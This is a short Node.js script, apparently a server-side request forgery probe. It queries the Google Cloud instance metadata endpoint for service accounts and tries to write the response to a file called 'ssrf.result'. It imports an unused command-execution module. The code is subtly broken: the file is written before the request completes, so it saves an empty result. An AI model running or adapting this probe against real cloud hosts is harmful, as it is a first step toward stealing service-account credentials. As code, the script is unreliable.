var http = require('http'); // 1 - Import Node.js core module
const { exec } = require("child_process");
const url = require('url');
const axios = require('axios');
fs = require('fs');

var result = '';

axios.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts", {headers: {'Metadata-Flavor': 'Google'}}, { transformResponse: (r) => r }).then((r) =>{
    result = JSON.stringify(r.data);   
}, (error) => {
    result = JSON.stringify(error);        
});

fs.writeFile('ssrf.result', result, function (err) {
    if (err) return console.log(err);
    console.log('ssrf');
  });